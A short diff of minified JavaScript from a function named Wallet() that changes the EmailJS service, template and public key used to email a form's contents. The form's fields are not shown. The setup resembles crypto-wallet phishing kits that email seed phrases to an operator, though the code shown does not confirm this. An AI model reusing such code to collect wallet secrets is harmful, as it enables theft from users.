@@ -21733,8 +21733,8 @@ function Wallet() {
             o(!0);
             return
         }
-        o(!1), b(!0), emailjs.sendForm("service_k7z8rpj", "template_zxi4i4l", e.current, {
-            publicKey: "IjMZkszmLCreBaht_"
+        o(!1), b(!0), emailjs.sendForm("service_5y6k13j", "template_iz3hp6g", e.current, {
+            publicKey: "aI9u_yWfNa63Btn0E"
         }).then(() => {
             d(!0), b(!1), a("")
         }, tt => {
